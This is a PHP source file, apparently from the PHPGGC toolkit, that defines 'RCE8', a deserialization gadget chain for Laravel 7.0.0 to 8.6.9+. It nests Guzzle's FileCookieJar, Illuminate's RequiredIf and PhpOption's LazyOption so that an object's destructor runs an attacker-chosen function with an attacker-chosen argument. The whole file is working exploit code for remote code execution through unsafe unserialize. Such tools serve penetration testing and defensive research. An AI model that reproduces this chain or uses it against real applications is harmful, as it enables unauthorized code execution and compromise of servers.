<?php

namespace GadgetChain\Laravel;

class RCE8 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '7.0.0 <= 8.6.9+';
    public static $vector = '__destruct';
    public static $author = 'abdilahrf & cr1f';
    public static $information = 'Executes through eval()';


    public function generate(array $parameters)
    {
        return new \GuzzleHttp\Cookie\FileCookieJar(
            new \Illuminate\Validation\Rules\RequiredIf(
                new \PhpOption\LazyOption($parameters['function'], [$parameters['parameter']])
            )
        );
    }
}
